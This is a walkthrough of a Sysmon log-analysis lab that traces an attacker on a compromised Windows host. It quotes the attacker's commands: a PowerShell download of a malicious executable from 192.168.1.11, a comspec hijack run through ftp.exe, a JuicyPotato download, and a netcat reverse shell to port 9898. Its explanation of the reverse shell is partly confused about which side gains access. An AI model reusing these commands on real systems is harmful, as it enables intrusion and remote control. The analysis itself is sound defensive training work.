# Sysmon Mini Project

System Monitor (Sysmon) is a Windows system service and device driver that can be useful for you because it provides a pretty detailed monitoring about what is happening in the operating system, starting from process monitoring, going through monitoring all the network and ending up with a discovery of the different types of exploitation techniques.

A Zipped file is provided and will help us to solve the challenges.

Download the “Sysmon logs”.zip and enter the password “blto” to access the files.

Tools/Utility used:- Text Editor, Linux CLI

Scenario

You are provided with Sysmon logs from a compromised endpoint. Analyse the logs to find out the steps and techniques used by the attacker.

# 1. What is the file that gave access to the attacker?

## Answer:- updater.hta

Look for the IP in the second question and search for that.

When going through the log, the 1st event with this IP, it could be seen that “chrome.exe was used to download an HTA file named updater.hta from the IP address”.

# 2. What is the PowerShell cmdlet used to download the malware file and what is the port?

## Answer:- INvoke-WebRequest, 6969

![](https://github.com/prakharvr02/Sysmon-Mini-Project/blob/main/Log%20Analysis%20Images/1.webp)

You will be seeing a log like this, in this it means that the attacker uses the “Invoke-Webrequest PowerShell cmdlet” to download a file named as “supply.exe” also the IP could be seen, the command means that

Download supply.exe file from the IP 192.168.1.11 port no 6969, utilizing the Invoke Powershell cmdlet.

So what info did we get from here

IP address : 192.168.1.11
Port No: 6969
Powershell cmdlet : INvoke-WebRequest

# 3. What is the name of the environment variable set by the attacker?

## Answer:- comspec=c:\Windows\temp\supply.exe

Explanation- Since supply.exe looks out to be a malicious executable, try and search around that.

# 4. What is the process used as a LOLBIN to execute malicious commands?

## Answer:- ftp.exe

The term “lolbin” is short for “living off the land binary” and refers to legitimate system binaries or tools that can be abused by attackers to execute malicious code or perform malicious actions. The use of lolbins is a common tactic used by attackers to evade detection and bypass security controls since these binaries are already present on the system and are often whitelisted by security software

Now when we check the log, we can see a new event just after the comspec environment variable was set.

![](https://github.com/prakharvr02/Sysmon-Mini-Project/blob/main/Log%20Analysis%20Images/2.webp)



A process with ProcessId 6844 and Image path “C:\Windows\SysWOW64\cmd.exe” executes the command “cmd \c set comspec=C:\windows\temp\supply.exe”. This command sets an environment variable “comspec” to the value “C:\windows\temp\supply.exe”.
A new process with ProcessId 6120 and Image path “C:\Windows\SysWOW64\ftp.exe” is then created. Now ftp.exe excutes the new environment variable “comspec” set to “C:\windows\temp\supply.exe”.
So ftp.exe can be considered as the LOLBIN.

# 5. Malware executed multiple same commands at a time, what is the first command executed?

## Answer:- ipconfig

Explanation- Keep an eye on supply.exe throughout, “C:\\windows\\temp\\supply.exe /c \”ipconfig\”

# 6. Looking at the dependency events around the malware, can you able to figure out the language, the malware is written?

## Answer:- python

![](https://github.com/prakharvr02/Sysmon-Mini-Project/blob/main/Log%20Analysis%20Images/3.webp)



# 7. Malware then downloads a new file, find out the full url of the file download

## Answer:- https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

Explanation- Focus on supply.exe command line

“C:\\windows\\temp\\supply.exe /c \”powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\”\n”,

The meaning of each argument for “powershell” is:

“-c”: specifies that the following command should be executed in a new PowerShell session.
“Invoke-WebRequest”: is a PowerShell cmdlet used to download a file from a URL.
“-Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe": specifies the URL from where the file should be downloaded.
“-OutFile C:\Windows\Temp\juice.exe”: specifies the file path and name where the downloaded file should be saved.
Overall, this command is attempting to download a file named “JuicyPotato.exe” from the URL “https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe" and save it to the directory “C:\Windows\Temp\” on the local machine with the name “juice.exe”.

# 8. What is the port the attacker attempts to get reverse shell?

## Answer:- 9898

![](https://github.com/prakharvr02/Sysmon-Mini-Project/blob/main/Log%20Analysis%20Images/4.webp)


```
Explanation- Attacker used juicy.exe to spawn a netcat shell back to their system, ”juicy.exe -l 9999 -p nc.exe -a \”192.168.1.11 9898 -e cmd.exe\”

“C:\\windows\\temp\\supply.exe /c \”juicy.exe -l 9999 -p nc.exe -a \”192.168.1.11 9898 -e cmd.exe\” -t t -c {B91D5831-B1BD-4608–8198-D72E155020F7}\”\n”,

Now what does this mean:

“C:\windows\temp\supply.exe” — This is the path to an executable file called “supply.exe” located in the “C:\windows\temp” directory. This means that the command will execute the “supply.exe” program.

/c — This is a command switch that tells the command interpreter to run the command following it. In this case, the command to run is “juicy.exe”.

“juicy.exe” — This is another executable file that is being run by “supply.exe”. This means that “juicy.exe” is a payload or an additional program that will be executed.

-l 9999 — This specifies the port number to listen on. In this case, it is port 9999.

-p nc.exe — This specifies the payload to use. In this case, it is “nc.exe”. “nc.exe” is a command-line utility that allows data to be sent and received over a network.

-a “192.168.1.11 9898 -e cmd.exe” — This specifies the IP address and port number to connect to, along with the payload to execute. In this case, the IP address is “192.168.1.11” and the port number is “9898”. “-e” specifies that the next argument is the payload to execute, which is “cmd.exe”. This means that “cmd.exe” will be executed on the remote system after a connection has been established.

-t t — This specifies the type of payload. In this case, it is “t”. It is unclear what this means without further context.

c {B91D5831-B1BD-4608–8198-D72E155020F7} — This specifies the unique identifier for the command. This means that this command has an identifier of “{B91D5831-B1BD-4608–8198-D72E155020F7}”.
In short The command starts by running “supply.exe”, which is a tool used to execute other programs or payloads.

“supply.exe” is given the command “/c” which tells it to execute a command. The command it executes is “juicy.exe”.

“juicy.exe” is a payload or program that will be executed. It appears to be a tool used for network exploitation or remote access.

“juicy.exe” is given several options. “-l 9999” tells it to listen for incoming connections on port 9999. “-p nc.exe” tells it to use the “nc.exe” payload for the incoming connection. “-a” specifies the IP address and port number to connect to. In this case, it is “192.168.1.11” on port “9898”. “-e cmd.exe” tells “nc.exe” to execute the “cmd.exe” program on the remote system. This gives the local system remote access to the command prompt of the remote system.

So the command is essentially setting up a network connection to a remote system at IP address “192.168.1.11” and port “9898”, and then executing the “cmd.exe” program on that system using the “nc.exe” payload.
```
